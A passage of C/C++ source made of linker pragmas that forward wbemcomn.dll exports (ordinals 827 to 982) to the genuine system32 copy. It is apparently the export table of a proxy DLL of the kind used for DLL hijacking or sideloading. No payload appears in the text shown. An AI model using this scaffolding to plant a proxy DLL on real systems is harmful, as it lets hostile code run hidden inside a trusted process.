#pragma comment (linker, "/export:?GetUnknown@CVar@@QEAAPEAUIUnknown@@XZ=c:/windows/system32/wbemcomn.?GetUnknown@CVar@@QEAAPEAUIUnknown@@XZ,@827")
#pragma comment (linker, "/export:?GetUnknownAt@CSafeArray@@QEAAPEAUIUnknown@@H@Z=c:/windows/system32/wbemcomn.?GetUnknownAt@CSafeArray@@QEAAPEAUIUnknown@@H@Z,@828")
#pragma comment (linker, "/export:?GetValue@CDMTFParser@@QEAAHH@Z=c:/windows/system32/wbemcomn.?GetValue@CDMTFParser@@QEAAHH@Z,@829")
#pragma comment (linker, "/export:?GetVarVector@CVar@@QEAAPEAVCVarVector@@XZ=c:/windows/system32/wbemcomn.?GetVarVector@CVar@@QEAAPEAVCVarVector@@XZ,@830")
#pragma comment (linker, "/export:?GetVariantAt@CSafeArray@@QEAA?AUtagVARIANT@@H@Z=c:/windows/system32/wbemcomn.?GetVariantAt@CSafeArray@@QEAA?AUtagVARIANT@@H@Z,@831")
#pragma comment (linker, "/export:?GetWMIADAPCmdLine@@YAPEAGH@Z=c:/windows/system32/wbemcomn.?GetWMIADAPCmdLine@@YAPEAGH@Z,@832")
#pragma comment (linker, "/export:?GetWMITraceSession@@YAPEAXXZ=c:/windows/system32/wbemcomn.?GetWMITraceSession@@YAPEAXXZ,@833")
#pragma comment (linker, "/export:?GetWhenDoneHandle@CExecRequest@@QEAAPEAXXZ=c:/windows/system32/wbemcomn.?GetWhenDoneHandle@CExecRequest@@QEAAPEAXXZ,@834")
#pragma comment (linker, "/export:?GetWord@CVar@@QEAAGXZ=c:/windows/system32/wbemcomn.?GetWord@CVar@@QEAAGXZ,@835")
#pragma comment (linker, "/export:?GetYear@CDateTimeParser@@QEAAIXZ=c:/windows/system32/wbemcomn.?GetYear@CDateTimeParser@@QEAAIXZ,@836")
#pragma comment (linker, "/export:?GetZero@CWbemTime@@SA?AV1@XZ=c:/windows/system32/wbemcomn.?GetZero@CWbemTime@@SA?AV1@XZ,@837")
#pragma comment (linker, "/export:?Get_WPP_INIT_TRACING_Call_State@@YA_NXZ=c:/windows/system32/wbemcomn.?Get_WPP_INIT_TRACING_Call_State@@YA_NXZ,@838")
#pragma comment (linker, "/export:?Grow@CFlexQueue@@IEAA_NXZ=c:/windows/system32/wbemcomn.?Grow@CFlexQueue@@IEAA_NXZ,@839")
#pragma comment (linker, "/export:?Grow@CSmallArrayBlob@@IEAAPEAV1@XZ=c:/windows/system32/wbemcomn.?Grow@CSmallArrayBlob@@IEAAPEAV1@XZ,@840")
#pragma comment (linker, "/export:?Halt@CHaltable@@QEAAJXZ=c:/windows/system32/wbemcomn.?Halt@CHaltable@@QEAAJXZ,@841")
#pragma comment (linker, "/export:?HandleEmbeddedObjectProperties@CTextTemplate@@AEAAPEAGPEAGPEAUIWbemClassObject@@@Z=c:/windows/system32/wbemcomn.?HandleEmbeddedObjectProperties@CTextTemplate@@AEAAPEAGPEAGPEAUIWbemClassObject@@@Z,@842")
#pragma comment (linker, "/export:?HasChildren@CClientOpsNode@@QEAA_NXZ=c:/windows/system32/wbemcomn.?HasChildren@CClientOpsNode@@QEAA_NXZ,@843")
#pragma comment (linker, "/export:?HasOwner@CNtSecurityDescriptor@@QEAAHXZ=c:/windows/system32/wbemcomn.?HasOwner@CNtSecurityDescriptor@@QEAAHXZ,@844")
#pragma comment (linker, "/export:?HasToBeEnabled@CTraceSessionControl@@QEAA_NXZ=c:/windows/system32/wbemcomn.?HasToBeEnabled@CTraceSessionControl@@QEAA_NXZ,@845")
#pragma comment (linker, "/export:?ImpersonateClient@CWbemCallSecurity@@UEAAJXZ=c:/windows/system32/wbemcomn.?ImpersonateClient@CWbemCallSecurity@@UEAAJXZ,@846")
#pragma comment (linker, "/export:?InOrder@CQl1ParseSink@@UEAAXJ@Z=c:/windows/system32/wbemcomn.?InOrder@CQl1ParseSink@@UEAAXJ@Z,@847")
#pragma comment (linker, "/export:?IncrementIndex@CFlexQueue@@IEAAXAEAH@Z=c:/windows/system32/wbemcomn.?IncrementIndex@CFlexQueue@@IEAAXAEAH@Z,@848")
#pragma comment (linker, "/export:?Init@CPropertyName@@QEAAXXZ=c:/windows/system32/wbemcomn.?Init@CPropertyName@@QEAAXXZ,@849")
#pragma comment (linker, "/export:?Init@CPublishWMIOperationEvent@@SAJXZ=c:/windows/system32/wbemcomn.?Init@CPublishWMIOperationEvent@@SAJXZ,@850")
#pragma comment (linker, "/export:?Init@CVar@@AEAAXXZ=c:/windows/system32/wbemcomn.?Init@CVar@@AEAAXXZ,@851")
#pragma comment (linker, "/export:?InitMap@CWbemInstallObject@@SAXXZ=c:/windows/system32/wbemcomn.?InitMap@CWbemInstallObject@@SAXXZ,@852")
#pragma comment (linker, "/export:?InitTls@CExecQueue@@KAXXZ=c:/windows/system32/wbemcomn.?InitTls@CExecQueue@@KAXXZ,@853")
#pragma comment (linker, "/export:?InitToken@CAbstractQl1Parser@@KAXPEAU_tag_WbemQl1Token@@@Z=c:/windows/system32/wbemcomn.?InitToken@CAbstractQl1Parser@@KAXPEAU_tag_WbemQl1Token@@@Z,@854")
#pragma comment (linker, "/export:?Initialize@CMUILocaleList@@QEAAJPEAG_N@Z=c:/windows/system32/wbemcomn.?Initialize@CMUILocaleList@@QEAAJPEAG_N@Z,@855")
#pragma comment (linker, "/export:?Initialize@CSmallArrayBlob@@IEAAXH@Z=c:/windows/system32/wbemcomn.?Initialize@CSmallArrayBlob@@IEAAXH@Z,@856")
#pragma comment (linker, "/export:?Initialize@CTraceSessionControl@@QEAAKPEBG@Z=c:/windows/system32/wbemcomn.?Initialize@CTraceSessionControl@@QEAAKPEBG@Z,@857")
#pragma comment (linker, "/export:?Initialize@CUnk@@UEAAHXZ=c:/windows/system32/wbemcomn.?Initialize@CUnk@@UEAAHXZ,@858")
#pragma comment (linker, "/export:?InitializeThread@CExecQueue@@MEAAJXZ=c:/windows/system32/wbemcomn.?InitializeThread@CExecQueue@@MEAAJXZ,@859")
#pragma comment (linker, "/export:?Insert@CClientOpsNode@@AEAAXPEAV1@@Z=c:/windows/system32/wbemcomn.?Insert@CClientOpsNode@@AEAAXPEAV1@@Z,@860")
#pragma comment (linker, "/export:?InsertAt@CFlexArray@@QEAAHHPEAX@Z=c:/windows/system32/wbemcomn.?InsertAt@CFlexArray@@QEAAHHPEAX@Z,@861")
#pragma comment (linker, "/export:?InsertAt@CSmallArrayBlob@@QEAAPEAV1@HPEAX@Z=c:/windows/system32/wbemcomn.?InsertAt@CSmallArrayBlob@@QEAAPEAV1@HPEAX@Z,@862")
#pragma comment (linker, "/export:?InsertAt@CVarVector@@QEAAHHAEAVCVar@@@Z=c:/windows/system32/wbemcomn.?InsertAt@CVarVector@@QEAAHHAEAVCVar@@@Z,@863")
#pragma comment (linker, "/export:?InsertAt@CWStringArray@@QEAAHHPEBG@Z=c:/windows/system32/wbemcomn.?InsertAt@CWStringArray@@QEAAHHPEBG@Z,@864")
#pragma comment (linker, "/export:?InternalAddRef@CUnkInternal@@QEAAKXZ=c:/windows/system32/wbemcomn.?InternalAddRef@CUnkInternal@@QEAAKXZ,@865")
#pragma comment (linker, "/export:?InternalQueryInterface@CUnkInternal@@QEAAJAEBU_GUID@@PEAPEAX@Z=c:/windows/system32/wbemcomn.?InternalQueryInterface@CUnkInternal@@QEAAJAEBU_GUID@@PEAPEAX@Z,@866")
#pragma comment (linker, "/export:?InternalRawArrayAccess@CVarVector@@QEAAJXZ=c:/windows/system32/wbemcomn.?InternalRawArrayAccess@CVarVector@@QEAAJXZ,@867")
#pragma comment (linker, "/export:?InternalRelease@CUnkInternal@@QEAAKXZ=c:/windows/system32/wbemcomn.?InternalRelease@CUnkInternal@@QEAAKXZ,@868")
#pragma comment (linker, "/export:?Intersection@CWStringArray@@SAXAEAV1@00@Z=c:/windows/system32/wbemcomn.?Intersection@CWStringArray@@SAXAEAV1@00@Z,@869")
#pragma comment (linker, "/export:?IsAdmin@@YAHPEAX@Z=c:/windows/system32/wbemcomn.?IsAdmin@@YAHPEAX@Z,@870")
#pragma comment (linker, "/export:?IsAppropriateThread@CExecQueue@@MEAAHXZ=c:/windows/system32/wbemcomn.?IsAppropriateThread@CExecQueue@@MEAAHXZ,@871")
#pragma comment (linker, "/export:?IsDataNull@CVar@@QEAAHXZ=c:/windows/system32/wbemcomn.?IsDataNull@CVar@@QEAAHXZ,@872")
#pragma comment (linker, "/export:?IsEmbeddedObjectProperty@CTextTemplate@@AEAAHPEAG@Z=c:/windows/system32/wbemcomn.?IsEmbeddedObjectProperty@CTextTemplate@@AEAAHPEAG@Z,@873")
#pragma comment (linker, "/export:?IsEmpty@CInsertionString@@QEAAHXZ=c:/windows/system32/wbemcomn.?IsEmpty@CInsertionString@@QEAAHXZ,@874")
#pragma comment (linker, "/export:?IsEmpty@CInstructionQueue@@QEAAHXZ=c:/windows/system32/wbemcomn.?IsEmpty@CInstructionQueue@@QEAAHXZ,@875")
#pragma comment (linker, "/export:?IsEnabled@CTraceSessionControl@@QEAA_NXZ=c:/windows/system32/wbemcomn.?IsEnabled@CTraceSessionControl@@QEAA_NXZ,@876")
#pragma comment (linker, "/export:?IsEntered@CCheckedInCritSec@@QEAAHXZ=c:/windows/system32/wbemcomn.?IsEntered@CCheckedInCritSec@@QEAAHXZ,@877")
#pragma comment (linker, "/export:?IsEntered@CEnterWbemCriticalSection@@QEAAHXZ=c:/windows/system32/wbemcomn.?IsEntered@CEnterWbemCriticalSection@@QEAAHXZ,@878")
#pragma comment (linker, "/export:?IsEventEnabled@CPublishWMIOperationEvent@@SAJAEBU_EVENT_DESCRIPTOR@@@Z=c:/windows/system32/wbemcomn.?IsEventEnabled@CPublishWMIOperationEvent@@SAJAEBU_EVENT_DESCRIPTOR@@@Z,@879")
#pragma comment (linker, "/export:?IsFinite@CWbemInterval@@QEBAHXZ=c:/windows/system32/wbemcomn.?IsFinite@CWbemInterval@@QEBAHXZ,@880")
#pragma comment (linker, "/export:?IsFinite@CWbemTime@@QEBAHXZ=c:/windows/system32/wbemcomn.?IsFinite@CWbemTime@@QEBAHXZ,@881")
#pragma comment (linker, "/export:?IsHalted@CHaltable@@QEAAHXZ=c:/windows/system32/wbemcomn.?IsHalted@CHaltable@@QEAAHXZ,@882")
#pragma comment (linker, "/export:?IsIdleTooLong@CExecQueue@@MEAAHPEAVCThreadRecord@1@K@Z=c:/windows/system32/wbemcomn.?IsIdleTooLong@CExecQueue@@MEAAHPEAVCThreadRecord@1@K@Z,@883")
#pragma comment (linker, "/export:?IsImpersonating@CWbemCallSecurity@@UEAAHXZ=c:/windows/system32/wbemcomn.?IsImpersonating@CWbemCallSecurity@@UEAAHXZ,@884")
#pragma comment (linker, "/export:?IsInAdminGroup@@YAHXZ=c:/windows/system32/wbemcomn.?IsInAdminGroup@@YAHXZ,@885")
#pragma comment (linker, "/export:?IsInitialized@CWbemInstallObject@@CA_NXZ=c:/windows/system32/wbemcomn.?IsInitialized@CWbemInstallObject@@CA_NXZ,@886")
#pragma comment (linker, "/export:?IsInterval@CDMTFParser@@QEAA_NXZ=c:/windows/system32/wbemcomn.?IsInterval@CDMTFParser@@QEAA_NXZ,@887")
#pragma comment (linker, "/export:?IsLocalConnection@@YAHPEAUIUnknown@@@Z=c:/windows/system32/wbemcomn.?IsLocalConnection@@YAHPEAUIUnknown@@@Z,@888")
#pragma comment (linker, "/export:?IsLocalService@@YAHPEAX@Z=c:/windows/system32/wbemcomn.?IsLocalService@@YAHPEAX@Z,@889")
#pragma comment (linker, "/export:?IsNT@@YAHXZ=c:/windows/system32/wbemcomn.?IsNT@@YAHXZ,@890")
#pragma comment (linker, "/export:?IsNetworkService@@YAHPEAX@Z=c:/windows/system32/wbemcomn.?IsNetworkService@@YAHPEAX@Z,@891")
#pragma comment (linker, "/export:?IsNtSetupRunning@@YAHXZ=c:/windows/system32/wbemcomn.?IsNtSetupRunning@@YAHXZ,@892")
#pragma comment (linker, "/export:?IsNull@CVar@@QEAAHXZ=c:/windows/system32/wbemcomn.?IsNull@CVar@@QEAAHXZ,@893")
#pragma comment (linker, "/export:?IsOffline@CWbemInstallObject@@SA_NXZ=c:/windows/system32/wbemcomn.?IsOffline@CWbemInstallObject@@SA_NXZ,@894")
#pragma comment (linker, "/export:?IsOk@CExecRequest@@QEAA_NXZ=c:/windows/system32/wbemcomn.?IsOk@CExecRequest@@QEAA_NXZ,@895")
#pragma comment (linker, "/export:?IsOptimized@CVarVector@@QEAAHXZ=c:/windows/system32/wbemcomn.?IsOptimized@CVarVector@@QEAAHXZ,@896")
#pragma comment (linker, "/export:?IsPrivilegePresent@@YA_NPEAXJ@Z=c:/windows/system32/wbemcomn.?IsPrivilegePresent@@YA_NPEAXJ@Z,@897")
#pragma comment (linker, "/export:?IsSTA@CExecQueue@@MEAAHXZ=c:/windows/system32/wbemcomn.?IsSTA@CExecQueue@@MEAAHXZ,@898")
#pragma comment (linker, "/export:?IsSTAThread@CExecQueue@@SAHXZ=c:/windows/system32/wbemcomn.?IsSTAThread@CExecQueue@@SAHXZ,@899")
#pragma comment (linker, "/export:?IsSuitableThread@CExecQueue@@MEAAHPEAVCThreadRecord@1@PEAVCExecRequest@@@Z=c:/windows/system32/wbemcomn.?IsSuitableThread@CExecQueue@@MEAAHPEAVCThreadRecord@1@PEAVCExecRequest@@@Z,@900")
#pragma comment (linker, "/export:?IsUsed@CDMTFParser@@QEAA_NH@Z=c:/windows/system32/wbemcomn.?IsUsed@CDMTFParser@@QEAA_NH@Z,@901")
#pragma comment (linker, "/export:?IsUser@CNtSid@@QEAA_NXZ=c:/windows/system32/wbemcomn.?IsUser@CNtSid@@QEAA_NXZ,@902")
#pragma comment (linker, "/export:?IsUserInGroup@CNtSecurity@@SAHPEAXAEAVCNtSid@@PEAH@Z=c:/windows/system32/wbemcomn.?IsUserInGroup@CNtSecurity@@SAHPEAXAEAVCNtSid@@PEAH@Z,@903")
#pragma comment (linker, "/export:?IsValid@CDMTFParser@@QEAA_NXZ=c:/windows/system32/wbemcomn.?IsValid@CDMTFParser@@QEAA_NXZ,@904")
#pragma comment (linker, "/export:?IsValid@CNtAcl@@QEAAHXZ=c:/windows/system32/wbemcomn.?IsValid@CNtAcl@@QEAAHXZ,@905")
#pragma comment (linker, "/export:?IsValid@CNtSecurityDescriptor@@QEAAHXZ=c:/windows/system32/wbemcomn.?IsValid@CNtSecurityDescriptor@@QEAAHXZ,@906")
#pragma comment (linker, "/export:?IsValid@CNtSid@@QEAAHXZ=c:/windows/system32/wbemcomn.?IsValid@CNtSid@@QEAAHXZ,@907")
#pragma comment (linker, "/export:?IsValidAmPmString@CDateTimeParser@@IEAAHPEAGPEBGQEAPEAG@Z=c:/windows/system32/wbemcomn.?IsValidAmPmString@CDateTimeParser@@IEAAHPEAGPEBGQEAPEAG@Z,@908")
#pragma comment (linker, "/export:?IsValidColonMillisecond@CDateTimeParser@@IEAAHPEAGPEBG@Z=c:/windows/system32/wbemcomn.?IsValidColonMillisecond@CDateTimeParser@@IEAAHPEAGPEBG@Z,@909")
#pragma comment (linker, "/export:?IsValidDateTime@CDateTimeParser@@QEAAHXZ=c:/windows/system32/wbemcomn.?IsValidDateTime@CDateTimeParser@@QEAAHXZ,@910")
#pragma comment (linker, "/export:?IsValidDayNumber@CDateTimeParser@@IEAAHPEAGPEBG@Z=c:/windows/system32/wbemcomn.?IsValidDayNumber@CDateTimeParser@@IEAAHPEAGPEBG@Z,@911")
#pragma comment (linker, "/export:?IsValidDotMillisecond@CDateTimeParser@@IEAAHPEAGPEBG@Z=c:/windows/system32/wbemcomn.?IsValidDotMillisecond@CDateTimeParser@@IEAAHPEAGPEBG@Z,@912")
#pragma comment (linker, "/export:?IsValidElementName2@@YAHPEBGKH@Z=c:/windows/system32/wbemcomn.?IsValidElementName2@@YAHPEBGKH@Z,@913")
#pragma comment (linker, "/export:?IsValidElementName@@YAHPEBGK@Z=c:/windows/system32/wbemcomn.?IsValidElementName@@YAHPEBGK@Z,@914")
#pragma comment (linker, "/export:?IsValidHourNumber@CDateTimeParser@@IEAAHPEAGPEBG@Z=c:/windows/system32/wbemcomn.?IsValidHourNumber@CDateTimeParser@@IEAAHPEAGPEBG@Z,@915")
#pragma comment (linker, "/export:?IsValidMinuteNumber@CDateTimeParser@@IEAAHPEAGPEBG@Z=c:/windows/system32/wbemcomn.?IsValidMinuteNumber@CDateTimeParser@@IEAAHPEAGPEBG@Z,@916")
#pragma comment (linker, "/export:?IsValidMonthNumber@CDateTimeParser@@IEAAHPEAGPEBG@Z=c:/windows/system32/wbemcomn.?IsValidMonthNumber@CDateTimeParser@@IEAAHPEAGPEBG@Z,@917")
#pragma comment (linker, "/export:?IsValidMonthString@CDateTimeParser@@IEAAHPEAGPEBGQEAPEAG2@Z=c:/windows/system32/wbemcomn.?IsValidMonthString@CDateTimeParser@@IEAAHPEAGPEBGQEAPEAG2@Z,@918")
#pragma comment (linker, "/export:?IsValidSecondNumber@CDateTimeParser@@IEAAHPEAGPEBG@Z=c:/windows/system32/wbemcomn.?IsValidSecondNumber@CDateTimeParser@@IEAAHPEAGPEBG@Z,@919")
#pragma comment (linker, "/export:?IsValidVectorArray@CVarVector@@SAHHPEAUtagSAFEARRAY@@@Z=c:/windows/system32/wbemcomn.?IsValidVectorArray@CVarVector@@SAHHPEAUtagSAFEARRAY@@@Z,@920")
#pragma comment (linker, "/export:?IsValidVectorType@CVarVector@@SAHH@Z=c:/windows/system32/wbemcomn.?IsValidVectorType@CVarVector@@SAHH@Z,@921")
#pragma comment (linker, "/export:?IsValidYearMonthDayNumber@CDateTimeParser@@IEAAHPEAG@Z=c:/windows/system32/wbemcomn.?IsValidYearMonthDayNumber@CDateTimeParser@@IEAAHPEAG@Z,@922")
#pragma comment (linker, "/export:?IsValidYearNumber@CDateTimeParser@@IEAAHPEAGPEBGH@Z=c:/windows/system32/wbemcomn.?IsValidYearNumber@CDateTimeParser@@IEAAHPEAGPEBGH@Z,@923")
#pragma comment (linker, "/export:?IsW2KOrMore@@YAHXZ=c:/windows/system32/wbemcomn.?IsW2KOrMore@@YAHXZ,@924")
#pragma comment (linker, "/export:?IsWildcard@CDMTFParser@@QEAA_NH@Z=c:/windows/system32/wbemcomn.?IsWildcard@CDMTFParser@@QEAA_NH@Z,@925")
#pragma comment (linker, "/export:?IsZero@CWbemInterval@@QEBAHXZ=c:/windows/system32/wbemcomn.?IsZero@CWbemInterval@@QEBAHXZ,@926")
#pragma comment (linker, "/export:?IsZero@CWbemTime@@QEBAHXZ=c:/windows/system32/wbemcomn.?IsZero@CWbemTime@@QEBAHXZ,@927")
#pragma comment (linker, "/export:?LCID_To_Culture_Format@CMUILocale@@SAJKPEAG_K@Z=c:/windows/system32/wbemcomn.?LCID_To_Culture_Format@CMUILocale@@SAJKPEAG_K@Z,@928")
#pragma comment (linker, "/export:?LCID_To_ms_XXX_Format@CMUILocale@@SAJKPEAG_K@Z=c:/windows/system32/wbemcomn.?LCID_To_ms_XXX_Format@CMUILocale@@SAJKPEAG_K@Z,@929")
#pragma comment (linker, "/export:?Leave@CCheckedInCritSec@@QEAAXXZ=c:/windows/system32/wbemcomn.?Leave@CCheckedInCritSec@@QEAAXXZ,@930")
#pragma comment (linker, "/export:?Leave@CCritSec@@QEAAXXZ=c:/windows/system32/wbemcomn.?Leave@CCritSec@@QEAAXXZ,@931")
#pragma comment (linker, "/export:?Leave@CExecQueue@@QEAAXXZ=c:/windows/system32/wbemcomn.?Leave@CExecQueue@@QEAAXXZ,@932")
#pragma comment (linker, "/export:?Leave@CStaticCritSec@@QEAAXXZ=c:/windows/system32/wbemcomn.?Leave@CStaticCritSec@@QEAAXXZ,@933")
#pragma comment (linker, "/export:?Leave@CWbemCriticalSection@@QEAAXXZ=c:/windows/system32/wbemcomn.?Leave@CWbemCriticalSection@@QEAAXXZ,@934")
#pragma comment (linker, "/export:?Length@WString2@@QEBAHXZ=c:/windows/system32/wbemcomn.?Length@WString2@@QEBAHXZ,@935")
#pragma comment (linker, "/export:?Length@WString@@QEBAHXZ=c:/windows/system32/wbemcomn.?Length@WString@@QEBAHXZ,@936")
#pragma comment (linker, "/export:?LocaleName_To_LCID@CMUILocale@@SAJPEBGPEA_NPEAK@Z=c:/windows/system32/wbemcomn.?LocaleName_To_LCID@CMUILocale@@SAJPEBGPEA_NPEAK@Z,@937")
#pragma comment (linker, "/export:?Lock@?$CLockableFlexArray@VCStaticCritSec@@@@QEAAXXZ=c:/windows/system32/wbemcomn.?Lock@?$CLockableFlexArray@VCStaticCritSec@@@@QEAAXXZ,@938")
#pragma comment (linker, "/export:?Lock@CClientOpsNode@@QEAAXXZ=c:/windows/system32/wbemcomn.?Lock@CClientOpsNode@@QEAAXXZ,@939")
#pragma comment (linker, "/export:?LockRegion@CBuffer@@UEAAJT_ULARGE_INTEGER@@0K@Z=c:/windows/system32/wbemcomn.?LockRegion@CBuffer@@UEAAJT_ULARGE_INTEGER@@0K@Z,@940")
#pragma comment (linker, "/export:?LogError@CExecQueue@@MEAAXPEAVCExecRequest@@H@Z=c:/windows/system32/wbemcomn.?LogError@CExecQueue@@MEAAXPEAVCExecRequest@@H@Z,@941")
#pragma comment (linker, "/export:?LoggingLevelEnabled@@YAHK@Z=c:/windows/system32/wbemcomn.?LoggingLevelEnabled@@YAHK@Z,@942")
#pragma comment (linker, "/export:?MakeInternalCopyOfThread@CWbemCallSecurity@@SAPEAV1@XZ=c:/windows/system32/wbemcomn.?MakeInternalCopyOfThread@CWbemCallSecurity@@SAPEAV1@XZ,@943")
#pragma comment (linker, "/export:?MakeOptimized@CVarVector@@QEAAHHHH@Z=c:/windows/system32/wbemcomn.?MakeOptimized@CVarVector@@QEAAHHHH@Z,@944")
#pragma comment (linker, "/export:?MarkForRemoval@CTimerInstruction@@UEAAJXZ=c:/windows/system32/wbemcomn.?MarkForRemoval@CTimerInstruction@@UEAAJXZ,@945")
#pragma comment (linker, "/export:?Match@CLike@@QEAA_NPEBG@Z=c:/windows/system32/wbemcomn.?Match@CLike@@QEAA_NPEBG@Z,@946")
#pragma comment (linker, "/export:?MatchSet@CLike@@IEAA_NPEBG0AEAH@Z=c:/windows/system32/wbemcomn.?MatchSet@CLike@@IEAA_NPEBG0AEAH@Z,@947")
#pragma comment (linker, "/export:?MoveToSubkey@Registry@@QEAAHPEBG@Z=c:/windows/system32/wbemcomn.?MoveToSubkey@Registry@@QEAAHPEBG@Z,@948")
#pragma comment (linker, "/export:?Mrci1Decompress@CBaseMrciCompression@@QEAAIPEAEI0I@Z=c:/windows/system32/wbemcomn.?Mrci1Decompress@CBaseMrciCompression@@QEAAIPEAEI0I@Z,@949")
#pragma comment (linker, "/export:?Mrci1MaxCompress@CBaseMrciCompression@@QEAAIPEAEI0I@Z=c:/windows/system32/wbemcomn.?Mrci1MaxCompress@CBaseMrciCompression@@QEAAIPEAEI0I@Z,@950")
#pragma comment (linker, "/export:?Mrci2Decompress@CBaseMrciCompression@@QEAAIPEAEI0I@Z=c:/windows/system32/wbemcomn.?Mrci2Decompress@CBaseMrciCompression@@QEAAIPEAEI0I@Z,@951")
#pragma comment (linker, "/export:?Mrci2MaxCompress@CBaseMrciCompression@@QEAAIPEAEI0I@Z=c:/windows/system32/wbemcomn.?Mrci2MaxCompress@CBaseMrciCompression@@QEAAIPEAEI0I@Z,@952")
#pragma comment (linker, "/export:?Next@CAbstractQl1Parser@@MEAAHH@Z=c:/windows/system32/wbemcomn.?Next@CAbstractQl1Parser@@MEAAHH@Z,@953")
#pragma comment (linker, "/export:?Next@CWQLScanner@@AEAAHXZ=c:/windows/system32/wbemcomn.?Next@CWQLScanner@@AEAAHXZ,@954")
#pragma comment (linker, "/export:?NormalizeCimDateTime@@YAHPEBGPEAPEAG@Z=c:/windows/system32/wbemcomn.?NormalizeCimDateTime@@YAHPEBGPEAPEAG@Z,@955")
#pragma comment (linker, "/export:?NotifyStartingThread@CTimerGenerator@@MEAAXXZ=c:/windows/system32/wbemcomn.?NotifyStartingThread@CTimerGenerator@@MEAAXXZ,@956")
#pragma comment (linker, "/export:?NotifyStoppingThread@CTimerGenerator@@MEAAXXZ=c:/windows/system32/wbemcomn.?NotifyStoppingThread@CTimerGenerator@@MEAAXXZ,@957")
#pragma comment (linker, "/export:?ObjectCreated@CContainerControl@@UEAAHPEAUIUnknown@@@Z=c:/windows/system32/wbemcomn.?ObjectCreated@CContainerControl@@UEAAHPEAUIUnknown@@@Z,@958")
#pragma comment (linker, "/export:?ObjectDestroyed@CContainerControl@@UEAAXPEAUIUnknown@@@Z=c:/windows/system32/wbemcomn.?ObjectDestroyed@CContainerControl@@UEAAXPEAUIUnknown@@@Z,@959")
#pragma comment (linker, "/export:?OnInitialize@CUnk@@UEAAHXZ=c:/windows/system32/wbemcomn.?OnInitialize@CUnk@@UEAAHXZ,@960")
#pragma comment (linker, "/export:?Open@CEventLog@@QEAAHXZ=c:/windows/system32/wbemcomn.?Open@CEventLog@@QEAAHXZ,@961")
#pragma comment (linker, "/export:?Open@Registry@@QEAAHPEAUHKEY__@@PEBGK@Z=c:/windows/system32/wbemcomn.?Open@Registry@@QEAAHPEAUHKEY__@@PEBGK@Z,@962")
#pragma comment (linker, "/export:?OrderAces@CNtAcl@@QEAAPEAV1@XZ=c:/windows/system32/wbemcomn.?OrderAces@CNtAcl@@QEAAPEAV1@XZ,@963")
#pragma comment (linker, "/export:?Parse@CAbstractQl1Parser@@QEAAHPEAVCQl1ParseSink@@H@Z=c:/windows/system32/wbemcomn.?Parse@CAbstractQl1Parser@@QEAAHPEAVCQl1ParseSink@@H@Z,@964")
#pragma comment (linker, "/export:?Parse@CWQLScanner@@QEAAHXZ=c:/windows/system32/wbemcomn.?Parse@CWQLScanner@@QEAAHXZ,@965")
#pragma comment (linker, "/export:?Parse@QL1_Parser@@QEAAHPEAPEAUQL_LEVEL_1_RPN_EXPRESSION@@@Z=c:/windows/system32/wbemcomn.?Parse@QL1_Parser@@QEAAHPEAPEAUQL_LEVEL_1_RPN_EXPRESSION@@@Z,@966")
#pragma comment (linker, "/export:?ParseAbsolute@CDMTFParser@@IEAAXPEBG@Z=c:/windows/system32/wbemcomn.?ParseAbsolute@CDMTFParser@@IEAAXPEBG@Z,@967")
#pragma comment (linker, "/export:?ParseDate@CDMTFParser@@IEAAXPEBG@Z=c:/windows/system32/wbemcomn.?ParseDate@CDMTFParser@@IEAAXPEBG@Z,@968")
#pragma comment (linker, "/export:?ParseInterval@CDMTFParser@@IEAAXPEBG@Z=c:/windows/system32/wbemcomn.?ParseInterval@CDMTFParser@@IEAAXPEBG@Z,@969")
#pragma comment (linker, "/export:?ParsePart@CDMTFParser@@IEAAHPEBGHHPEAHHH@Z=c:/windows/system32/wbemcomn.?ParsePart@CDMTFParser@@IEAAHPEBGHHPEAHHH@Z,@970")
#pragma comment (linker, "/export:?Peek@CFlexQueue@@QEAAPEAXXZ=c:/windows/system32/wbemcomn.?Peek@CFlexQueue@@QEAAPEAXXZ,@971")
#pragma comment (linker, "/export:?ProcessArray@CTextTemplate@@AEAAPEAGAEBUtagVARIANT@@PEAG@Z=c:/windows/system32/wbemcomn.?ProcessArray@CTextTemplate@@AEAAPEAGAEBUtagVARIANT@@PEAG@Z,@972")
#pragma comment (linker, "/export:?Publish@CPublishWMIOperationEvent@@SAJPEAGKK000K0@Z=c:/windows/system32/wbemcomn.?Publish@CPublishWMIOperationEvent@@SAJPEAGKK000K0@Z,@973")
#pragma comment (linker, "/export:?PublishClientRequestFailure@CPublishWMIOperationEvent@@SAJPEBGPEAG1K10J0@Z=c:/windows/system32/wbemcomn.?PublishClientRequestFailure@CPublishWMIOperationEvent@@SAJPEBGPEAG1K10J0@Z,@974")
#pragma comment (linker, "/export:?PublishESSDrop@CPublishWMIOperationEvent@@SAJPEAG0@Z=c:/windows/system32/wbemcomn.?PublishESSDrop@CPublishWMIOperationEvent@@SAJPEAG0@Z,@975")
#pragma comment (linker, "/export:?PublishEssStarted@CPublishWMIOperationEvent@@SAJPEAG00K0K0@Z=c:/windows/system32/wbemcomn.?PublishEssStarted@CPublishWMIOperationEvent@@SAJPEAG00K0K0@Z,@976")
#pragma comment (linker, "/export:?PublishEssToConsumer@CPublishWMIOperationEvent@@SAJPEAG0@Z=c:/windows/system32/wbemcomn.?PublishEssToConsumer@CPublishWMIOperationEvent@@SAJPEAG0@Z,@977")
#pragma comment (linker, "/export:?PublishProviderInfo@CPublishWMIOperationEvent@@SAJKPEAGK000PEAUIWbemContext@@@Z=c:/windows/system32/wbemcomn.?PublishProviderInfo@CPublishWMIOperationEvent@@SAJKPEAGK000PEAUIWbemContext@@@Z,@978")
#pragma comment (linker, "/export:?PublishProviderStarted@CPublishWMIOperationEvent@@SAJPEAGJ0K0@Z=c:/windows/system32/wbemcomn.?PublishProviderStarted@CPublishWMIOperationEvent@@SAJPEAGJ0K0@Z,@979")
#pragma comment (linker, "/export:?PublishRepDelete@CPublishWMIOperationEvent@@SAJKPEAGPEAUIWbemContext@@@Z=c:/windows/system32/wbemcomn.?PublishRepDelete@CPublishWMIOperationEvent@@SAJKPEAGPEAUIWbemContext@@@Z,@980")
#pragma comment (linker, "/export:?PublishRepUpdate@CPublishWMIOperationEvent@@SAJKPEAGKPEAUIWbemContext@@@Z=c:/windows/system32/wbemcomn.?PublishRepUpdate@CPublishWMIOperationEvent@@SAJKPEAGKPEAUIWbemContext@@@Z,@981")
#pragma comment (linker, "/export:?PublishStop@CPublishWMIOperationEvent@@SAJKJPEAG@Z=c:/windows/system32/wbemcomn.?PublishStop@CPublishWMIOperationEvent@@SAJKJPEAG@Z,@982")
